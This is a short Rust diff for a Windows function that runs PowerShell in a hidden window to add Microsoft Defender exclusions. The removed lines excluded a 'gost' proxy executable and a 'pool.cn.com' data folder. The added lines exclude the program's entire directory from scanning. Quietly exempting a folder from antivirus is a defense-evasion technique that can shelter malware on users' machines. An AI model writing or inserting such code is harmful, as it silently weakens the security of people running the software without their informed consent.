@@ -6,18 +6,26 @@ use std::os::windows::process::CommandExt;
 
 #[cfg(target_os = "windows")]
 pub fn add_gost_exclusion() -> Result<(), String> {
-    let script = r#"
+    let exe_dir = std::env::current_exe()
+        .map_err(|e| format!("无法定位程序目录: {}", e))?
+        .parent()
+        .ok_or_else(|| "无法定位程序目录".to_string())?
+        .to_string_lossy()
+        .replace("'", "''");
+    let script = format!(
+        r#"
 $ErrorActionPreference = 'Stop'
-try {
-    Add-MpPreference -ExclusionProcess 'gost-x86_64-pc-windows-msvc.exe'
-    Add-MpPreference -ExclusionPath (Join-Path $env:LOCALAPPDATA 'pool.cn.com')
+try {{
+    Add-MpPreference -ExclusionPath '{exe_dir}'
     'OK'
-} catch {
-    'ERR:' + $_.Exception.Message
-}
-"#;
+}} catch {{
+    Write-Output ('ERR:' + $_.Exception.Message)
+    exit 1
+}}
+"#
+    );
     let out = std::process::Command::new("powershell")
-        .args(["-NoProfile", "-NonInteractive", "-Command", script])
+        .args(["-NoProfile", "-NonInteractive", "-Command", &script])
         .creation_flags(0x08000000) // CREATE_NO_WINDOW
         .output()
         .map_err(|e| e.to_string())?;
